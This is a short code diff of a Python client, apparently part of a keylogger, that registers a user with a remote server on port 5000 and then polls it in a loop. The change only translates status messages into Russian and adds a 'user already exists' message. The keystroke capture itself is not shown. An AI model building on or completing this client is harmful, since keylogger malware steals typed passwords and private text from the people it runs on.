@@ -12,9 +12,9 @@ def registration(server_url, user):
     registration_data = keylogger.registration()
     answer = requests.post(server_url+':5000/new_client', json=registration_data).json()
     if answer['status'] == 'successfully':
-        print('\n[+] Successfully registration')
+        print('\n[+] Удачная регистрация')
     else: 
-        print('\n[+] Unsuccessfully registration')   
+        print('\n[+] Неудачная регистрация')   
 
 def check_user(server_url, user):
     keylogger = KeyLogger(user)
@@ -25,9 +25,11 @@ def check_user(server_url, user):
 
 def main():
     server_url = sys.argv[1]
-    user = input('Input your name: ')
+    user = input('Введите ваше имя: ')
     if not is_registred(server_url, user):
         registration(server_url, user)
+    else:
+        print('[+] Пользователь уже существует в системе.')
     while True:
         check_user(server_url, user)
 
